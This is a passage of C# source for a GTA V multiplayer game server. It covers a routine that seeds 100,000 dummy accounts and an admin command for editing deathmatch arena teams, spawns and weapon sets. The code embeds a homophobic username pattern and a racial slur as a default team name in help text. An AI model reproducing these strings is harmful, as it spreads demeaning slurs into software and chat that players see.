                    int max_id = context.Accounts.Max(a => a.SQL_ID);
                    for (int i = max_id; i < max_id + 100000; i++)
                    {
                        var _newAcc = new Account
                        {
                            Email = "[]",
                            Password = "[]",
                            Salt = "[]",
                            Username = $"leo_is_gay_{i}",
                            DiscordInfo = "[]",
                            ChallengeInfo = "[]",
                            AutoLogin = true,
                            Admin = 0,
                            RegisterHWID = "[]",
                            RegisterIP = "[]",
                            RegisterRID = 123123,
                            RegisterSC = "[]",
                            LastHWID = "[]",
                            LastIP = "[]",
                            LastRID = 123123,
                            LastSC = "[]",
                            MuteTime = 0,
                            MuteReason = "N/A",
                            JailTime = 0,
                            JailReason = "N/A",
                            DerbyWins = 0,
                            Level = 1,
                            Medkits = 0,
                            Painkillers = 0,
                            Language = -1,
                            XP = 1,
                            Escapes = 0,
                            Arrests = 0,
                            Kills = 1,
                            Deaths = 1,
                            MinutesPlayed = 1.0,
                            LastSessionMins = 0.0,
                            DonatorPoints = 0,
                            Points = 10,
                            Warns = 0,
                            Suspended = 0,
                            DonatorLevel = 0,
                            LobbyClothing = 1,
                            LoadoutCop = "?",
                            LoadoutFugitive = "?",
                            CarCop = "?",
                            CarFugitive = "?",
                            WeaponComponents = "[]",
                            MOTD = "none",
                            RegisterDate = DateTime.Now,
                            LastLogin = DateTime.Now,
                            Character = "{}",
                            PurchasedAmmo = "{}",
                            ChallengeStreak = 0,
                            CompletedDailyChallenge = false,
                            Namechanges = 0,
                            ClanTier = -1,
                            ClanID = -1
                        };
                        await context.Accounts.AddAsync(_newAcc);

                        var _newVeh = new OwnedVehData
                        {
                            AccountSQLID = i,
                            Model = "golf dva",
                            Team = 0,
                            TimesUsed = 0,
                        };
                        await context.OwnedVehicles.AddAsync(_newVeh);

                        var _newWep = new OwnedLoadoutData
                        {
                            AccountSQLID = i,
                            Name = "rambo",
                            Team = 1,
                            TimesUsed = 0
                        };
                        await context.OwnedLoadouts.AddAsync(_newWep);

                        await context.SaveChangesAsync();
                        if (i % 1000 == 0)
                        {
                            Console.WriteLine($"[DUMMY ACCOUNTS] Progress: {i}/{max_id + 100000}");
                        }
                    }
                }
            });
            EPlayer.SendMessage(player, "~g~[>] ~w~This is done asynchronously so it should not freeze the server [main thread].");
            EPlayer.SendMessage(player, "~g~[>] ~w~It will probably take a while to add all accounts! It saves database often.");
        }

        private void editdmarena_OnValidateDmArena(Player player, string options, KeyValuePair<CustomDMArenas, bool> arena)
        {
            NAPI.Task.Run(() =>
            {

                string[] args = options.Split(' ');
                string rebuild = "";
                for (int i = 0; i < args.Length; i++) rebuild = $"{rebuild} [{i}]{args[i]}";
                //player.TriggerEvent("pushMsgToChat", options); // only for deboog bpurpoooses
                //player.TriggerEvent("pushMsgToChat", rebuild); // only for debooog burpooses

                if (args[0].Equals("help", StringComparison.OrdinalIgnoreCase))
                {
                    if (args.Length <= 1)
                    {
                        player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}[USAGE] editdmarena help (list/add/remove/set) | Choose any one category.");
                        return;
                    }

                    player.TriggerEvent("pushMsgToChat", "!{#990000}=============================");

                    if (args[1].Equals("list", StringComparison.OrdinalIgnoreCase))
                    {
                        if (args.Length <= 2)
                        {
                            player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena list teams !{#FFFFFF}| Use 'help list teams' for more.");
                            player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena list team !{#FFFFFF}| Use 'help list team' to unload da fuck im tired -kevy.");
                            return;
                        }

                        if (args[2].Equals("team"))
                        {
                            if (args.Length <= 3)
                            {
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena list team (team id) (stats/weaponsets/spawns/weaponset/spawn) !{#FFFFFF}| Use 'help list team (item)' to get info for the items separately.");
                                return;
                            }

                            if (args[3].Equals("stats"))
                            {
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena list team (team id) stats !{#FFFFFF}| Displays the stats of a team and settings such as blip, hp bar type, hp, etc.");
                            }
                            else if (args[3].Equals("weaponsets"))
                            {
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena list team (team id) weaponsets !{#FFFFFF}| Displays all the weapon sets for a team with their indexes. (NOTE: index changes when any set is removed)");
                            }
                            else if (args[3].Equals("spawns"))
                            {
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena list team (team id) spawns !{#FFFFFF}| Displays all the spawns for a team.");
                            }
                            else if (args[3].Equals("weaponset"))
                            {
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena list team (team id) weaponset (index) !{#FFFFFF}| Gives you the specific weapon set at index and lists it as well.");
                            }
                            else if (args[3].Equals("spawn"))
                            {
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena list team (team id) spawn (spawn id) !{#FFFFFF}| Teleports you to the specific spawn and lists it's coordinates as well.");
                            }
                            else
                            {
                                cmd_editdmarena(player, "help list team");
                            }
                        }
                        else if (args[2].Equals("teams"))
                        {
                            player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena list teams !{#FFFFFF}| Shows you the darkest and deepest secrets (quick list) of all teams.");
                            player.TriggerEvent("pushMsgToChat", "!{#FFFFFF}You may want to use 'list team (teamid) stats' to show the proper and full info on a team.");
                        }
                        else
                        {
                            cmd_editdmarena(player, "help list");
                        }
                    }
                    else if (args[1].Equals("add", StringComparison.OrdinalIgnoreCase))
                    {
                        if (args.Length <= 2)
                        {
                            player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena add team (team id) !{#FFFFFF}| Use 'help add team' to show more.");
                            player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena add spawn (team id) !{#FFFFFF}| Use 'help add spawn' to show more.");
                            player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena add weaponset (team id) !{#FFFFFF}| Use 'help add weaponset' to show more.");
                            return;
                        }

                        if (args[2].Equals("team"))
                        {
                            player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena add team (team id) !{#FFFFFF}| Adds a new team with the specified team ID. Below is the more info:");
                            player.TriggerEvent("pushMsgToChat", "!{#FFFFFF}Players on the same team cannot damage each other nor will they be able to 'click' at each other (fire in direct LOS).");
                            player.TriggerEvent("pushMsgToChat", "!{#FFFFFF}The only exception is team ID -1, which is to be used for all Free For All type modes. All spawns for Team ID -1 can be used by other teams as well.");
                            player.TriggerEvent("pushMsgToChat", "!{#FFFFFF}Team ID -1 players can damage each other as well.");
                        }
                        else if (args[2].Equals("weaponset"))
                        {
                            player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena add weaponset (team id) !{#FFFFFF}| This basically makes a new weapon set for the team out of the weapons on your player.");
                            player.TriggerEvent("pushMsgToChat", "!{#FFFFFF}It will copy all the weapons, ammo and components of the weapons you have equipped. A weapon will not be detected if it's ammo is less than 1.");
                        }
                        else if (args[2].Equals("spawn"))
                        {
                            player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena add spawn (team id) !{#FFFFFF}| Creates a new spawn at your current location for the specified team.");
                            player.TriggerEvent("pushMsgToChat", "!{#FFFFFF}This copies everything from X, Y, Z coordinates to Heading (A).");
                        }
                        else
                        {
                            cmd_editdmarena(player, "help add");
                        }
                    }
                    else if (args[1].Equals("remove", StringComparison.OrdinalIgnoreCase))
                    {
                        if (args.Length <= 2)
                        {
                            player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena remove team (team id) !{#FFFFFF}| Use 'help remove team' for more.");
                            player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena remove spawn (spawn id) !{#FFFFFF}| Use 'help remove spawn' for more.");
                            player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena remove weaponset (team id) (index) !{#FFFFFF}| Use 'help remove weaponset' for more (important).");
                            return;
                        }

                        if (args[2].Equals("team"))
                        {
                            player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena remove team (team id) !{#FFFFFF}| Removes the specified team from the arena, along with all its weapon sets etc.");
                            player.TriggerEvent("pushMsgToChat", "!{#FFFFFF}When a team is removed, all it's spawns, weaponsets and data is deleted.");
                        }
                        else if (args[2].Equals("weaponset"))
                        {
                            player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena remove weaponset (team id) (index) !{#FFFFFF}| Removes the weapon set at the specified index of team weapon sets.");
                            player.TriggerEvent("pushMsgToChat", "!{#FFFFFF}The important thing to note here is this unlike spawns and other, the weaponsets work on indexes so when you remove " +
                                "any weapon set, the indexes of other ones decrease/change so if you want to remove multiple, confirm their indexes after each removal.");
                        }
                        else if (args[2].Equals("spawn"))
                        {
                            player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena remove spawn (spawn id) !{#FFFFFF}| Removes the spawn with the specified ID.");
                        }
                        else
                        {
                            cmd_editdmarena(player, "help remove");
                        }
                    }
                    else if (args[1].Equals("set", StringComparison.OrdinalIgnoreCase))
                    {
                        if (args.Length <= 2)
                        {
                            player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena set team  !{#FFFFFF}| Use 'help set team' for more.");
                            return;
                        }

                        if (args[2].Equals("team"))
                        {
                            if (args.Length <= 3)
                            {
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena set team (team id) health (amount) !{#FFFFFF}| Use 'help set team health' for more.");
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena set team (team id) armour (amount) !{#FFFFFF}| Use 'help set team armour' for more.");
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena set team (team id) blip (true/false) !{#FFFFFF}| Use 'help set team blip' for more.");
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena set team (team id) blipcolor (color id) !{#FFFFFF}| Use 'help set team blipcolor' for more.");
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena set team (team id) alpha (0-255) !{#FFFFFF}| Use 'help set team alpha' for more.");
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena set team (team id) hpbar (bar type) !{#FFFFFF}| Use 'help set team hpbar' for more.");
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena set team (team id) name (name) !{#FFFFFF}| Use 'help set team name' for more.");
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena set team (team id) color (r) (g) (b) !{#FFFFFF}| Use 'help set team color' for more.");
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena set team (team id) sharedspawns (team id) !{#FFFFFF}| Use 'help set team sharedspawns' for more.");
                                return;
                            }

                            if (args[3].Equals("health"))
                            {
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena set team (team id) health (amount) !{#FFFFFF}| Sets the health for the team specified.");
                                player.TriggerEvent("pushMsgToChat", "!{#FFFFFF}The health when a player spawns as that team.");
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}Default: 100");
                            }
                            else if (args[3].Equals("armour"))
                            {
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena set team (team id) armour (amount) !{#FFFFFF}| Sets the armour for the team specified.");
                                player.TriggerEvent("pushMsgToChat", "!{#FFFFFF}The armour when a player spawns as that team.");
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}Default: 100");
                            }
                            else if (args[3].Equals("blip"))
                            {
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena set team (team id) blip (true/false) !{#FFFFFF}| Toggles the visibility of the team in minimap.");
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}Setting this to true means EVERYONE can see that player on minimap even though he can't.");
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}Default: True");
                            }
                            else if (args[3].Equals("blipcolor"))
                            {
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena set team (team id) blipcolor (color id) !{#FFFFFF}| Sets the blip color of a team.");
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}The blip colors are available on RAGE:MP site, the reason why this is not same as normal 'color' is because GTA 5 uses a separate color table for blips");
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}Default: 39");
                            }
                            else if (args[3].Equals("alpha"))
                            {
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena set team (team id) alpha (0-255) !{#FFFFFF}| Sets the transparency of a team.");
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}Any transparency level less than 33 will hide the player's nametag. 0 is fully invisible, 255 is opaque.");
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}Default: 255");
                            }
                            else if (args[3].Equals("hpbar"))
                            {
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena set team (team id) hpbar (bar type) !{#FFFFFF}| Sets the visibillity of HP bars for the players in the team.");
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}There are currently 3 available hp bar types, 0- Disable, 1- Always Show HP Bars, 2- Show Only On Aiming.");
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}THESE HP BARS ONLY TAKE EFFECT FOR THE PLAYER IN THIS TEAM! NOT FOR PEOPLE WHO LOOK AT THEM!");
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}Default: 2");
                            }
                            else if (args[3].Equals("name"))
                            {
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena set team (team id) name (name) !{#FFFFFF}| Sets the name of the team.");
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}The team name is not really used much anywhere except selection and stuff.");
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}Default: nigga...");
                            }
                            else if (args[3].Equals("color"))
                            {
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena set team (team id) color (red) (green) (blue) !{#FFFFFF}| Sets the RGB color of the team.");
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}This color is used in kill list and scoreboard.");
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}Default: 179 179 179");
                            }
                            else if (args[3].Equals("sharedspawns"))
                            {
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}editdmarena set team (team id) sharedspawns (target team id) !{#FFFFFF}| Eyes below ->");
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}This means that this team can also spawn at the spawns of the team id you input.");
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}Meaning if you set it's sharedspawns to -1, then this team's players can spawn at team -1's spawns.");
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}But team -1 players cannot spawn on this team's spawns, unless you set their sharedspawns to this team id.");
                                player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}Default: -1");
                            }
                            else
                            {
                                cmd_editdmarena(player, "help set team");
                            }
                        }
                        else
                        {
                            cmd_editdmarena(player, "help set");
                        }
                    }
                    else
                    {
                        cmd_editdmarena(player, "help");
                    }
                }
                else if (args[0].Equals("list", StringComparison.OrdinalIgnoreCase))
                {
                    if (args.Length <= 1)
                    {
                        cmd_editdmarena(player, "help list");
                        return;
                    }

                    if (args[1].Equals("teams", StringComparison.OrdinalIgnoreCase))
                    {
                        player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}===========| !{{#FFFF00}}{arena.Key.Name} ({arena.Key.SQL_ID}) Teams !{{#FF6347}}|===========");
                        int count = 0;
                        Task.Run(async () =>
                        {
                            using (MainDatabase context = ContextFactory.CreateContext())
                            {
                                foreach (var team in await context.CustomArenas_Teams.AsQueryable().Where(a => a.ArenaID == arena.Key.SQL_ID).ToListAsync())
                                {
                                    NAPI.Task.Run(() =>
                                    {
                                        player.TriggerEvent("pushMsgToChat", $"!{{{EPlayer.HexConverter(new Color(team.ColorR, team.ColorG, team.ColorB))}}}" + team.Name + " | ID: " + team.Team);
                                        player.TriggerEvent("pushMsgToChat", "!{#69f5a8}     --" + $"Spawn Health: {team.Health} | Spawn Armour: {team.Armour}");
                                        player.TriggerEvent("pushMsgToChat", "!{#69f5a8}     --" + $"Blips: {(team.Blip ? "Shown" : "Hidden")} | Blip Color ID: {team.BlipColor}");
                                        player.TriggerEvent("pushMsgToChat", "!{#69f5a8}     --" + $"Weapon Sets: {NAPI.Util.FromJson<DM_WeaponSets[]>(team.WeaponSets).Length} " +
                                            $"| Color: {EPlayer.HexConverter(new Color(team.ColorR, team.ColorG, team.ColorB))}");
                                    });
                                    count++;
                                }
                                NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", "!{#FFFF00}Total: !{#FFFFFF}" + count + " teams."); });
                            }
                        });

                    }
                    else if (args[1].Equals("team", StringComparison.OrdinalIgnoreCase))
                    {
                        if (args.Length <= 2)
                        {
                            cmd_editdmarena(player, "help list team");
                            return;
                        }

                        int teamID = -1;
                        if (!Int32.TryParse(args[2], out teamID))
                        {
                            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}The team ID you have input is invalid/not numeric!");
                            return;
                        }
                        Task.Run(async () =>
                        {
                            var team = await EPlayer.IsValidDMTeam(arena.Key.SQL_ID, teamID);
                            if (team.Value == false)
                            {
                                NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}The team ID you have input does not exist!"); });
                                return;
                            }
                            NAPI.Task.Run(() =>
                            {
                                if (args.Length <= 3)
                                {
                                    cmd_editdmarena(player, "help list team");
                                    return;
                                }
                            });

                            if (args[3].Equals("stats"))
                            {
                                NAPI.Task.Run(async () =>
                                {

                                    player.TriggerEvent("pushMsgToChat", $"!{{{EPlayer.HexConverter(new Color(team.Key.ColorR, team.Key.ColorG, team.Key.ColorB))}}}Team: " + team.Key.Name + " - ID: " + team.Key.Team +
                                        $" - Color: {EPlayer.HexConverter(new Color(team.Key.ColorR, team.Key.ColorG, team.Key.ColorB))}");

                                    player.TriggerEvent("pushMsgToChat", "!{#31b55a}HP: " + team.Key.Health + " - Armour: " + team.Key.Armour);
                                    player.TriggerEvent("pushMsgToChat", "!{#31b55a}Blips: " + (team.Key.Blip ? "Shown" : "Hidden") + " - Blip Color ID: " + team.Key.BlipColor);
                                    player.TriggerEvent("pushMsgToChat", "!{#31b55a}Weapon Sets: " + (NAPI.Util.FromJson<DM_WeaponSets[]>(team.Key.WeaponSets).Length) + " - Transparency/Alpha: " + team.Key.Alpha);

                                    string hpBars = "INVALID!!";
                                    switch (team.Key.ShowHPBars)
                                    {
                                        case 0:
                                            hpBars = "Never Show";
                                            break;
                                        case 1:
                                            hpBars = "Always Shown";
                                            break;
                                        case 2:
                                            hpBars = "Show On Aim";
                                            break;
                                        case 3:
                                            hpBars = "BUSTED! (Copchase Reserved)";
                                            break;
                                        default:
                                            hpBars = "Invalid! Please fix!";
                                            break;
                                    }

                                    using (MainDatabase context = ContextFactory.CreateContext())
                                    {
                                        int spawnsTotal = await context.CustomArenas_Spawns.AsQueryable().CountAsync(a => a.ArenaID == arena.Key.SQL_ID && a.Team == team.Key.Team);
                                        int spawnsTeam = await context.CustomArenas_Spawns.AsQueryable().CountAsync(a => a.ArenaID == arena.Key.SQL_ID && (a.Team == team.Key.Team || a.Team == team.Key.SharedSpawns));
                                        NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", $"!{{#31b55a}}Spawns: {spawnsTeam} (+{spawnsTotal - spawnsTeam} shared) - HP Bar Types: {hpBars}"); });
                                    }
                                });
                            }
                            else if (args[3].Equals("weaponsets"))
                            {
                                NAPI.Task.Run(() =>
                                {
                                    DM_WeaponSets[] weaponSets = NAPI.Util.FromJson<DM_WeaponSets[]>(team.Key.WeaponSets);

                                    jWeaponData wep = new jWeaponData();
                                    for (int set = 0; set < weaponSets.Length; set++)
                                    {
                                        player.TriggerEvent("pushMsgToChat", $"!{{#69f5a8}}Weapon Set @ Index {set} =>");
                                        foreach (var setdata in weaponSets[set].Weapons)
                                        {
                                            if (Settings.WeaponData.TryGetValue(setdata.Weapon, out wep))
                                            {
                                                if (setdata.Components.Length > 0) player.TriggerEvent("pushMsgToChat", "!{#31b55a}     -- " + wep.Name + " | Ammo: " + setdata.Ammo + " @ Attachments:");
                                                else player.TriggerEvent("pushMsgToChat", "!{#31b55a}" + wep.Name + " | Ammo: " + setdata.Ammo);

                                                foreach (long comp in setdata.Components)
                                                {
                                                    Component compData = new Component();
                                                    if (wep.Components.TryGetValue(comp, out compData))
                                                    {
                                                        player.TriggerEvent("pushMsgToChat", "!{#69f5a8}          -- " + compData.Name);
                                                    }
                                                }
                                            }
                                        }
                                        player.TriggerEvent("pushMsgToChat", "---");
                                    }
                                });
                            }
                            else if (args[3].Equals("spawns"))
                            {
                                using (MainDatabase context = ContextFactory.CreateContext())
                                {
                                    var spawns = await context.CustomArenas_Spawns.AsQueryable().Where(a => a.ArenaID == arena.Key.SQL_ID && (a.Team == team.Key.Team || a.Team == team.Key.SharedSpawns)).ToListAsync();
                                    foreach (var spawn in spawns)
                                    {
                                        NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", $"!{{#69f5a8}}ID: {spawn.SQL_ID} (Team {spawn.Team}) XYZA: {spawn.X}, {spawn.Y}, {spawn.Z}, {spawn.A}"); });
                                    }
                                }

                            }
                            else if (args[3].Equals("weaponset"))
                            {
                                NAPI.Task.Run(() =>
                                {
                                    if (args.Length <= 4)
                                    {
                                        cmd_editdmarena(player, "help list team weaponset");
                                        return;
                                    }

                                    int index = -1;
                                    if (!Int32.TryParse(args[4], out index))
                                    {
                                        player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}The index you have input is invalid/not numeric!");
                                        return;
                                    }

                                    DM_WeaponSets[] weaponSets = NAPI.Util.FromJson<DM_WeaponSets[]>(team.Key.WeaponSets);
                                    var set = weaponSets.ElementAtOrDefault(index);
                                    if (set == null || set == default(DM_WeaponSets))
                                    {
                                        player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}The index is not valid // There's no weapon set on that index!");
                                        return;
                                    }

                                    player.RemoveAllWeapons();
                                    jWeaponData wepdat = new jWeaponData();
                                    player.TriggerEvent("pushMsgToChat", $"!{{#69f5a8}}Weapon Set @ Index {index} =>");
                                    foreach (var wep in set.Weapons)
                                    {
                                        if (Settings.WeaponData.TryGetValue(wep.Weapon, out wepdat))
                                        {
                                            player.GiveWeapon((WeaponHash)wep.Weapon, wep.Ammo);

                                            if (wep.Components.Length > 0) player.TriggerEvent("pushMsgToChat", "!{#31b55a}     -- " + wepdat.Name + " | Ammo: " + wep.Ammo + " @ Attachments:");
                                            else player.TriggerEvent("pushMsgToChat", "!{#31b55a}" + wepdat.Name + " | Ammo: " + wep.Ammo);

                                            foreach (var comp in wep.Components)
                                            {
                                                EPlayer.AttachComponent(player, wep.Weapon, comp);

                                                Component compData = new Component();
                                                if (wepdat.Components.TryGetValue(comp, out compData))
                                                {
                                                    player.TriggerEvent("pushMsgToChat", "!{#69f5a8}          -- " + compData.Name);
                                                }
                                            }
                                        }
                                    }
                                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Spawned the weapon set at index " + index + ".");
                                });
                            }
                            else if (args[3].Equals("spawn"))
                            {
                                int sqlid = -1;
                                bool successParse = Int32.TryParse(args[4], out sqlid);
                                NAPI.Task.Run(() =>
                                {
                                    if (args.Length <= 4)
                                    {
                                        cmd_editdmarena(player, "help list team spawn");
                                        return;
                                    }

                                    if (!successParse)
                                    {
                                        player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}The ID you have input is invalid/not numeric!");
                                        return;
                                    }
                                });

                                var spawn = await EPlayer.IsValidDMSpawn(sqlid);
                                if (spawn.Value == false)
                                {
                                    NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}The spawn ID you have input is invalid!"); });
                                    return;
                                }
                                NAPI.Task.Run(() =>
                                {
                                    player.TriggerEvent("pushMsgToChat", $"!{{#69f5a8}}ArenaID: {spawn.Key.ArenaID} | ID: {spawn.Key.SQL_ID} (Team {spawn.Key.Team}) XYZA: {spawn.Key.X}, {spawn.Key.Y}, {spawn.Key.Z}, {spawn.Key.A}");
                                    player.Position = new Vector3(spawn.Key.X, spawn.Key.Y, spawn.Key.Z);
                                    player.Heading = spawn.Key.A;
                                });
                            }
                            else
                            {
                                NAPI.Task.Run(() => { cmd_editdmarena(player, "help list team"); });
                            }
                        });
                    }
                    else
                    {
                        cmd_editdmarena(player, "help list");
                    }
                }
                else if (args[0].Equals("add", StringComparison.OrdinalIgnoreCase))
                {
                    if (args.Length <= 1)
                    {
                        cmd_editdmarena(player, "help add");
                        return;
                    }

                    if (args[1].Equals("team"))
                    {
                        if (args.Length <= 2)
                        {
                            cmd_editdmarena(player, "help add team");
                            return;
                        }

                        int id = -1;
                        if (!Int32.TryParse(args[2], out id))
                        {
                            cmd_editdmarena(player, "help add team");
                            return;
                        }

                        Task.Run(async () =>
                        {
                            var team = await EPlayer.IsValidDMTeam(arena.Key.SQL_ID, id);
                            if (team.Value == true)
                            {
                                NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}This team ID already exists!"); });
                                return;
                            }

                            var _new = new CustomDMArenaTeams
                            {
                                ArenaID = arena.Key.SQL_ID,
                                Name = "changeme",
                                Team = id,
                                Health = 100,
                                Armour = 100,
                                Blip = true,
                                BlipColor = 39,
                                ColorR = 179,
                                ColorG = 179,
                                ColorB = 179,
                                Alpha = 255,
                                ShowHPBars = 2,
                                SharedSpawns = -1,
                                WeaponSets = "[]",
                            };
                            using (MainDatabase context = ContextFactory.CreateContext())
                            {
                                await context.CustomArenas_Teams.AddAsync(_new);
                                await context.SaveChangesAsync();
                            }
                            NAPI.Task.Run(() =>
                            {
                                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You have added a new team ID: " + _new.Team);

                            });
                        });
                    }
                    else if (args[1].Equals("spawn"))
                    {
                        if (args.Length <= 2)
                        {
                            cmd_editdmarena(player, "help add spawn");
                            return;
                        }

                        int teamid = -1;
                        if (!Int32.TryParse(args[2], out teamid))
                        {
                            cmd_editdmarena(player, "help add spawn");
                            return;
                        }
                        Task.Run(async () =>
                        {
                            var team = await EPlayer.IsValidDMTeam(arena.Key.SQL_ID, teamid);
                            if (!team.Value == true)
                            {
                                NAPI.Task.Run(() =>
                                {
                                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}The team ID is invalid/non existent!");
                                });
                                return;
                            }

                            NAPI.Task.Run(() =>
                            {
                                var _new = new CustomDMArenaSpawns
                                {
                                    ArenaID = arena.Key.SQL_ID,
                                    Team = team.Key.Team,
                                    X = player.Position.X,
                                    Y = player.Position.Y,
                                    Z = player.Position.Z,
                                    A = player.Heading,
                                };
                                Task.Run(async () =>
                                {
                                    using (MainDatabase context = ContextFactory.CreateContext())
                                    {
                                        await context.CustomArenas_Spawns.AddAsync(_new);
                                        await context.SaveChangesAsync();
                                    }
                                });

                                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You have added a new spawn for the team ID " + _new.Team + ": " + _new.SQL_ID);
                            });

                        });
                        
                    }
                    else if (args[1].Equals("weaponset"))
                    {
                        if (args.Length <= 2)
                        {
                            cmd_editdmarena(player, "help add weaponset");
                            return;
                        }

                        int teamid = -1;
                        if (!Int32.TryParse(args[2], out teamid))
                        {
                            cmd_editdmarena(player, "help add weaponset");
                            return;
                        }
                        Task.Run(async () =>
                        {
                            var team = await EPlayer.IsValidDMTeam(arena.Key.SQL_ID, teamid);
                            if (team.Value == false)
                            {
                                NAPI.Task.Run(() =>
                                {
                                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}The team ID is invalid/non existent!");
                                });
                                 return;
                            }
                            List<DM_WeaponData> wepDat = new List<DM_WeaponData>();
                            NAPI.Task.Run(() =>
                            {
                                foreach (KeyValuePair<long, jWeaponData> i in Settings.WeaponData)
                                {
                                    if (player.GetWeaponAmmo((WeaponHash)i.Key) > 0)
                                    {
                                        List<long> components = new List<long>();

                                        if (player.HasData("AttachedComponents"))
                                        {
                                            List<KeyValuePair<long, long>> comps = player.GetData<List<KeyValuePair<long, long>>>("AttachedComponents");

                                            foreach (var item in comps)
                                            {
                                                if (item.Key == i.Key)
                                                {
                                                    components.Add(item.Value);
                                                }
                                            }
                                        }

                                        wepDat.Add(new DM_WeaponData
                                        {
                                            Weapon = i.Key,
                                            Ammo = player.GetWeaponAmmo((WeaponHash)i.Key),
                                            Components = components.ToArray(),
                                        }); ;
                                    }
                                }

                                DM_WeaponSets[] weaponSets = NAPI.Util.FromJson<DM_WeaponSets[]>(team.Key.WeaponSets);

                                List<DM_WeaponSets> newWeaponSets = new List<DM_WeaponSets>(weaponSets);
                                newWeaponSets.Add(new DM_WeaponSets
                                {
                                    Weapons = wepDat.ToArray(),
                                });

                                team.Key.WeaponSets = NAPI.Util.ToJson(newWeaponSets.ToArray());
                                ContextFactory.SaveDB();

                                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You have added a new weapon set at index " + (newWeaponSets.Count - 1));
                            });
                        });
                        
                    }
                    else
                    {
                        cmd_editdmarena(player, "help add");
                    }
                }
                else if (args[0].Equals("remove", StringComparison.OrdinalIgnoreCase))
                {
                    if (args.Length <= 1)
                    {
                        cmd_editdmarena(player, "help remove");
                        return;
                    }

                    if (args[1].Equals("team"))
                    {
                        if (args.Length <= 2)
                        {
                            cmd_editdmarena(player, "help remove team");
                            return;
                        }

                        int id = -1;
                        if (!Int32.TryParse(args[2], out id))
                        {
